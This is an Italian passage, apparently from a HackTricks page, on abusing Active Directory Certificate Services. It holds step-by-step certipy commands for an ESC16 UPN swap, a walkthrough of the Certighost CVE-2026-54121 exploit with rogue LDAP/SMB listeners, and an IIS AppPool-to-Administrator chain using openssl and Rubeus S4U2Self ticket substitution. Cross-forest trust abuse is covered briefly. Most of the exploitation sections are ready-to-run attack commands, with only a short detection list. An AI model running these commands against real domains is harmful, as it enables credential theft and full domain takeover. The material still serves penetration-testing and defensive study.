**Passaggio 1: Leggere l'UPN iniziale dell'account della vittima (facoltativo, per il ripristino).**  


```bash
certipy account \
    -u 'attacker@corp.local' -p 'Passw0rd!' \
    -dc-ip '10.0.0.100' -user 'victim' \
    read
```

**Passaggio 2: Aggiorna l'UPN dell'account vittima con il `sAMAccountName` dell'amministratore target.  

```bash
certipy account \
    -u 'attacker@corp.local' -p 'Passw0rd!' \
    -dc-ip '10.0.0.100' -upn 'administrator' \
    -user 'victim' update
```

**Passaggio 3: (Se necessario) Ottieni le credenziali dell'account "vittima" (ad es., tramite Shadow Credentials).**

```shell
certipy shadow \
    -u 'attacker@corp.local' -p 'Passw0rd!' \
    -dc-ip '10.0.0.100' -account 'victim' \
    auto
```

**Passaggio 4: Richiedi un certificato come utente "vittima" usando un template di autenticazione client a cui l'account può iscriversi (ad es. "User") sulla CA configurata con ESC16.** La CA omette l'estensione di sicurezza SID dal certificato rilasciato, ma questo da solo non stabilisce un mapping di autenticazione utilizzabile. Imposta la variabile d'ambiente per la cache delle credenziali Kerberos (comando shell):

```bash
export KRB5CCNAME=victim.ccache
```

Quindi richiedi il certificato:

```bash
certipy req \
    -k -dc-ip '10.0.0.100' \
    -target 'CA.CORP.LOCAL' -ca 'CORP-CA' \
    -template 'User'
```

**Passaggio 5: Ripristina l'UPN dell'account "vittima".**

```bash
certipy account \
    -u 'attacker@corp.local' -p 'Passw0rd!' \
    -dc-ip '10.0.0.100' -upn 'victim@corp.local' \
    -user 'victim' update
```

**Passaggio 6: Su un KDC meno recente o in modalità compatibilità che accetta questa mappatura debole, autenticati come amministratore di destinazione.**

```bash
certipy auth \
    -dc-ip '10.0.0.100' -pfx 'administrator.pfx' \
    -username 'administrator' -domain 'corp.local'
```

## Rogue LDAP/LSA chase callback identity substitution (Certighost / CVE-2026-54121)

### Spiegazione

**Certighost** sfrutta un **percorso di enrollment chase / callback di AD CS** in cui la CA si fida degli attributi della richiesta forniti dal richiedente per determinare l'identità da inserire nel certificato emesso. Nel PoC pubblico, la richiesta appositamente creata include:<sup>[[1]](#references)[[2]](#references)</sup>

- **`cdc`**: host/IP controllato dall'attaccante che la CA contatterà
- **`rmd`**: il **nome DNS del Domain Controller target** da impersonare

Se la CA segue questo chase, si connetterà all'attaccante tramite **SMB/LSA (`445`)** e **LDAP (`389`)**. L'attaccante usa un **account computer reale** (di solito creato tramite il valore predefinito di **`ms-DS-MachineAccountQuota`**) affinché la sessione di callback si autentichi come principal di dominio valido, ma i servizi rogue restituiscono invece gli attributi di identità del **DC target**:

- `sAMAccountName`
- `objectSid` / SID
- `dNSHostName`

Se la CA **non associa crittograficamente l'identità restituita al principal autenticato della callback**, può emettere un certificato per il **Domain Controller**, anche se la sessione si è autenticata come account computer controllato dall'attaccante. Concettualmente, questo bug è diverso da **Certifried**: invece di riscrivere attributi AD come `dNSHostName`, l'attaccante **sostituisce i dati d'identità durante la risoluzione della callback della CA**.<sup>[[2]](#references)</sup>

**Prerequisiti utili:**

- **Credenziali di dominio** con privilegi limitati
- Possibilità di **creare o riutilizzare un account computer**
- Raggiungibilità di rete dalla **CA** alle porte **`389` e `445`** controllate dall'attaccante
- Percorso di richiesta della CA vulnerabile / non aggiornato (l'aggiornamento Microsoft del **14 luglio 2026** ha aggiunto la **convalida del DC per `cdc`** e un **confronto dei SID risolti**)

Il **`.pfx`** ottenuto può quindi essere usato per **PKINIT**, generando un **`.ccache`** e, nel flusso del PoC pubblicato, l'**hash NT del DC target**, normalmente sufficiente per **compromettere l'intero dominio**.

### Sfruttamento

Il PoC pubblico automatizza l'intera catena:<sup>[[1]](#references)</sup>

1. Creare o riutilizzare un **account computer** controllato dall'attaccante.
2. Avviare listener rogue **LDAP e SMB/LSA** sulle porte `389` e `445`.
3. Inviare una richiesta di certificato con gli attributi **`cdc`** controllato dall'attaccante e **`rmd`** del target.
4. Consentire alla CA di autenticarsi ai listener rogue come account computer controllato, rispondendo però alle ricerche d'identità con gli attributi del **DC target**.
5. Ricevere un **certificato DC** firmato dalla CA e usarlo per **PKINIT**.

```bash
sudo python3 certighost.py -d playground.local -u lowpriv -p 'Password1234' --dc-ip 192.168.1.10
```

Flag runtime utili dal PoC:

- `--listener <ip>`: sceglie esplicitamente l'IP di callback pubblicizzato in `cdc`
- `--computer-name <NAME$>`: riutilizza un account computer esistente invece di crearne uno nuovo

**Note operative:**

- Il PoC richiede **root** perché si lega alle **porte privilegiate** `389` e `445`.
- L'exploitation riuscito scrive localmente un **DC `.pfx`** e un **Kerberos `.ccache`**.
- Poiché il certificato è associato a un **account Domain Controller**, le azioni successive possono includere **autenticazione Kerberos basata su certificato**, **DCSync** e il riutilizzo dell'**hash NT del computer** recuperato.<sup>[[2]](#references)</sup>

## Registrazione del computer IIS AppPool per ottenere Administrator sullo stesso host

Un pool IIS in esecuzione come `ApplicationPoolIdentity` usa l'**account computer** del proprio host per l'accesso in uscita alle risorse di rete. Di conseguenza, l'esecuzione di codice come `IIS AppPool\<POOL>` resta a basso privilegio nel token locale, ma può inviare una richiesta AD CS che la CA autentica come `HOST$`; si tratta di una transizione dell'identità in uscita, non di impersonificazione del token né di un'elevazione locale in stile Potato.<sup>[[19]](#references)[[20]](#references)</sup>

Questa catena richiede un host IIS aggiunto al dominio, una Enterprise CA raggiungibile tramite RPC, un template di autenticazione computer pubblicato per il quale il computer abbia i diritti di registrazione, il supporto PKINIT e la raggiungibilità di KDC/SMB. Un'identità pool personalizzata cambia il principal in uscita, quindi verifica che il pool usi effettivamente `ApplicationPoolIdentity` prima di presumere che sia `HOST$`.<sup>[[19]](#references)[[20]](#references)</sup>

### Registrazione con chiave controllata dall'attaccante

Genera la coppia di chiavi e la CSR al di fuori del server IIS e conserva la chiave privata. Invia **solo la CSR** dal worker compromesso. Il [PoC ASPX Certi-Bhai](https://github.com/incredibleindishell/Certi-Bhai/blob/main/IIS_Privilege_escalation/cert.aspx) istanzia `CertificateAuthority.Request`, imposta `CertificateTemplate:Machine`, chiama `ICertRequest::Submit` e restituisce il certificato emesso. Usa la stringa di configurazione della CA `CAHOST\CA-NAME`; un normale template `Machine` crea il subject a partire da AD, quindi non sono necessari dati subject/SAN forniti dal richiedente.<sup>[[18]](#references)[[19]](#references)[[21]](#references)</sup>

Combina il certificato restituito con la **chiave conservata corrispondente**. `certutil -MergePFX machine_cert.cer machine_cert.pfx` funziona solo quando Windows può già associare il certificato a una chiave privata accessibile; per file PEM separati, crea esplicitamente un PKCS#12:<sup>[[19]](#references)[[23]](#references)</sup>

```bash
openssl pkcs12 -export -in machine_cert.cer -inkey machine_cert.key \
  -out machine_cert.pfx -name 'HOST$'
```

Usa il PFX per PKINIT e conserva il TGT del computer ottenuto in formato base64 invece di iniettarlo immediatamente:<sup>[[5]](#references)[[19]](#references)</sup>

```powershell
Rubeus.exe asktgt /user:HOST$ /domain:DOMAIN /certificate:machine_cert.pfx `
  /password:PFX_PASSWORD /nowrap
```

### S4U2Self più sostituzione del servizio sullo stesso host

S4U2Self consente a un servizio di ottenere un ticket **per sé stesso** contenente i dati di autorizzazione di un altro utente. Con il TGT del computer, Rubeus può richiedere quel ticket per un utente con privilegi, riscrivere il nome del servizio nel KRB-CRED restituito impostandolo su CIFS e iniettarlo. Questa è la primitiva locale “delega a te stesso”: non richiede S4U2Proxy né una voce `msDS-AllowedToDelegateTo`.<sup>[[5]](#references)[[17]](#references)[[22]](#references)</sup>

```powershell
Rubeus.exe s4u /self /impersonateuser:Administrator `
  /altservice:cifs/HOST.DOMAIN /ticket:BASE64_MACHINE_TGT /ptt /nowrap

klist
dir \\HOST.DOMAIN\C$
```

Il ticket sostituito può essere usato solo dai servizi associati allo **stesso account/chiave del computer** (in questo caso, CIFS su `HOST`). Non è un ticket Administrator riutilizzabile su altri computer del dominio. Inoltre, il risultato dimostrato consiste nell’accesso privilegiato a SMB/filesystem come Administrator; per ottenere un processo locale `NT AUTHORITY\SYSTEM` è comunque necessario un passaggio separato di esecuzione remota.<sup>[[5]](#references)[[17]](#references)[[19]](#references)</sup>

### Rilevamento e hardening

- Sulla CA, correlare gli eventi Certification Services **4886** (richiesta ricevuta) e **4887** (certificato emesso) per individuare richieste inattese del template `Machine` da parte di account server IIS.<sup>[[19]](#references)[[24]](#references)</sup>
- Sui DC, l’evento **4768** include campi relativi al certificato quando viene usata la pre-autenticazione basata su certificato; generare alert per richieste PKINIT TGT insolite da parte di account di web server. Verificare poi le richieste **4769** che coinvolgono un’identità privilegiata impersonata e lo stesso host. Poiché Rubeus `/altservice` riscrive lato client il nome del servizio in KRB-CRED, non è necessario che il nome del servizio nel 4769 lato DC sia `cifs`.<sup>[[5]](#references)[[25]](#references)[[26]](#references)</sup>
- Cercare `w3wp.exe` che raggiunge gli endpoint RPC della CA, la creazione inattesa di file ASPX, l’accesso alle condivisioni amministrative tramite Kerberos e attività di dumping dei secrets. Ove possibile, limitare l’accesso dal livello applicativo a CA RPC/KDC/SMB e rimuovere i diritti di enrollment dei computer o i template di autenticazione dei computer che non sono necessari per le operazioni.<sup>[[19]](#references)</sup>

## Compromissione delle foreste tramite certificati, spiegata con la forma passiva

### Rottura dei trust tra foreste tramite CA compromesse

La configurazione dell’**enrollment tra foreste** viene resa relativamente semplice. Il **certificato della root CA** della foresta delle risorse viene **pubblicato nelle foreste degli account** dagli amministratori, mentre i certificati delle **enterprise CA** della foresta delle risorse vengono **aggiunti ai container `NTAuthCertificates` e AIA in ogni foresta degli account**. In altre parole, questa configurazione concede alla **CA della foresta delle risorse il controllo completo** su tutte le altre foreste per cui gestisce la PKI. Se questa CA venisse **compromessa dagli attaccanti**, questi potrebbero **falsificare certificati** per tutti gli utenti delle foreste delle risorse e degli account, violando così il confine di sicurezza della foresta.<sup>[[6]](#references)</sup>

### Privilegi di enrollment concessi a principal esterni

Negli ambienti con più foreste, è necessario prestare attenzione alle Enterprise CA che **pubblicano template di certificati** che consentono agli **Authenticated Users o a principal esterni** (utenti/gruppi esterni alla foresta a cui appartiene l’Enterprise CA) di avere **diritti di enrollment e modifica**.\
Quando avviene un’autenticazione attraverso un trust, AD aggiunge al token dell’utente il **SID Authenticated Users**. Pertanto, se un dominio dispone di un’Enterprise CA con un template che **consente agli Authenticated Users i diritti di enrollment**, un utente di un’altra foresta potrebbe potenzialmente **richiedere un certificato tramite quel template**. Analogamente, se un template **concede esplicitamente diritti di enrollment a un principal esterno**, viene così **creata una relazione di controllo degli accessi tra foreste**, che consente a un principal di una foresta di **richiedere un certificato tramite un template di un’altra foresta**.

Entrambi gli scenari comportano un **ampliamento della superficie di attacco** tra le foreste. Un attaccante potrebbe sfruttare le impostazioni del template di certificato per ottenere privilegi aggiuntivi in un dominio esterno.<sup>[[6]](#references)</sup>


## References

- [1] [repository PoC di aniqfakhrul/CVE-2026-54121](https://github.com/aniqfakhrul/CVE-2026-54121)
- [2] [H0j3n - Analisi tecnica di Certighost](https://gist.github.com/H0j3n/a5ef2609b5f2944ac2390a191a534c26)
- [3] [Certify 2.0 – Blog di SpecterOps](https://specterops.io/blog/2025/08/11/certify-2-0/)
- [4] [GhostPack/Certify](https://github.com/GhostPack/Certify)
- [5] [GhostPack/Rubeus](https://github.com/GhostPack/Rubeus)
- [6] [SpecterOps – Certified Pre-Owned: abuso di Active Directory Certificate Services](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)
- [7] [Oliver Lyak – Certipy 4.0: ESC9, ESC10, GUI di BloodHound, nuovi metodi di autenticazione e richiesta e altro](https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7)
- [8] [SpecterOps – Shadow Credentials: abuso della mappatura degli account tramite Key Trust per il takeover degli account](https://specterops.io/blog/2021/06/17/shadow-credentials-abusing-key-trust-account-mapping-for-account-takeover/)
- [9] [CQure Academy – La storia dell’uso (improprio) di Enhanced Key](https://cqureacademy.com/blog/enhanced-key-usage)
- [10] [Compass Security – Relay verso AD Certificate Services tramite RPC](https://blog.compass-security.com/2022/11/relaying-to-ad-certificate-services-over-rpc/)
- [11] [hajo – ESC12: accesso shell alla CA ADCS con YubiHSM](https://pkiblog.knobloch.info/esc12-shell-access-to-adcs-ca-with-yubihsm)
- [12] [SpecterOps – Tecnica di abuso ADCS ESC13](https://specterops.io/blog/2024/02/14/adcs-esc13-abuse-technique/)
- [13] [SpecterOps – Tecnica di abuso ADCS ESC14](https://specterops.io/blog/2024/02/28/adcs-esc14-abuse-technique/)
- [14] [Wiki di Certipy – Escalation dei privilegi (ESC1-ESC17)](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation)
- [15] [TrustedSec – EKUwu: non è solo un’altra ESC di AD CS](https://trustedsec.com/blog/ekuwu-not-just-another-ad-cs-esc)
- [16] [Furious5 – AD CS ESC16: misconfigurazione e sfruttamento](https://medium.com/@muneebnawaz3849/ad-cs-esc16-misconfiguration-and-exploitation-9264e022a8c6)
- [17] [Charlie Clark – Riconsiderando “Delegate 2 Thyself”](https://exploit.ph/revisiting-delegate-2-thyself.html)
- [18] [incredibleindishell/Certi-Bhai – PoC di enrollment IIS AD CS](https://github.com/incredibleindishell/Certi-Bhai/blob/main/IIS_Privilege_escalation/cert.aspx)
- [19] [Mannu Linux – Escalation dei privilegi da IIS AppPool tramite l’endpoint RPC di AD CS](https://mannulinux.org/2026/08/Privilege-escalation-from-IIS-AppPool-to-NT-AuthoritySYSTEM-via-AD-CS-RPC-endpoint.html)
- [20] [Microsoft – Identità dei pool di applicazioni](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities)
- [21] [Microsoft – ICertRequest::Submit](https://learn.microsoft.com/en-us/windows/win32/api/certcli/nf-certcli-icertrequest-submit)
- [22] [Specifiche aperte Microsoft – S4U2self](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/02636893-7a1f-4357-af9a-b672e3e3de13)
- [23] [OpenSSL – comando pkcs12](https://docs.openssl.org/3.6/man1/openssl-pkcs12/)
- [24] [Microsoft – Verifica di Certification Services](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/audit-certification-services)
- [25] [Microsoft – Evento 4768: è stato richiesto un ticket di autenticazione Kerberos](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4768)
- [26] [Microsoft – Evento 4769: è stato richiesto un ticket di servizio Kerberos](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4769)
- [27] [incredibleindishell/Certi-Bhai – toolkit di sfruttamento AD CS per PowerShell](https://github.com/incredibleindishell/Certi-Bhai)
{{#include ../../../banners/hacktricks-training.md}}
